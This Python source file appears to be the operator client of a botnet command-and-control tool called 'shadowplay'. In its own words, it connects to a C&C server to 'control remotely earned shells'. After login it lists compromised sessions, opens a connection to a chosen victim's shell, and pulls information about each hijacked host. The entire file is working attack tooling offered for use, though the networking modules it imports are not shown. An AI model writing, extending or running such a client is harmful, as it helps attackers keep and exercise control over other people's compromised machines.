#!/bin/python3

from argparse import ArgumentParser
from getpass import getpass
from os import system

from modules.comms import Comms
from modules.read import read_session_file, get_address_arg, read_session_info
from modules.colors import Colors
from modules.help import print_help


c = Colors()

parser = ArgumentParser(usage="python3 shadowplay.py --node <user>@<node-address>:<port>",
                        prog="shadowplay: command-and-control client for python.\n",
                        description="Connect to any node running shadowplay-srv. Control remotely earned shells.",
                            epilog="See https://github.com/entr0pie/shadowplay-cli for more information.")

parser.add_argument("-n", "--node", type=str, required=True, help="connect to a node")
args = parser.parse_args()

USER, host = args.node.split("@")

print("\n<< shadowplay command-and-control (C&C) system >>\n")

try:
    ADDRESS, PORT = host.split(':')
    PORT = int(PORT)

except ValueError: 
    ADDRESS, PORT = host, 10000

comms = Comms(ADDRESS, PORT)

print(f"Connecting to {ADDRESS}:{PORT} ... ", end="")

if not comms.is_alive():
    print(f"{c.fail}no.{c.reset}\nError: node seems down. Verify your internet connection.\n")
    exit(1)

if not comms.is_botnet_server():
    print(f"{c.fail}no.{c.reset}\nError: server does not respond correctly (maybe a mismatched port?)\n")
    exit(1)

print(f"{c.ok}ok{c.reset}")

PASSWD = getpass(prompt=f"{USER}'s password: ")

print("Login in... ", end="")

TOKEN = comms.get_token(USER, PASSWD)

if TOKEN == 32 * "0": 
    print(f"{c.fail}no.{c.reset}\nLogin failed, check your credentials.")
    exit(1)

print(f"{c.ok}ok logged in.{c.reset}")
print(f"Your session: {c.bold}{TOKEN}{c.reset}")

token_file = open('token.tmp', 'w')
token_file.write(TOKEN)
token_file.close()

print("\nType \"help\" or ? for more information.\n")

while True:
    try:
        command = input(f"{USER}@{ADDRESS}> ").strip().lower()

        if command == "help" or command == "?":
            print_help()

        elif command == "sessions":
            sessions = comms.get_sessions(TOKEN)
            sessions_file = open('sessions.tmp', 'w')
            sessions_file.write(sessions)
            sessions_file.close()
            read_session_file()
            

        elif command[:7] == "connect": 
            ip, port = get_address_arg(command)
            comms.connect_session(ip, port, TOKEN)

        elif command[:5] == "whois":
            
            ip, port = get_address_arg(command)
            print(f"\n{ip} INFO")
            print("================")
            session_info = comms.get_session_info(ip, port, TOKEN)
            
            read_session_info(session_info) 
    
    except KeyboardInterrupt:
        system("rm token.tmp")
        system("rm sessions.tmp")
        exit(0)

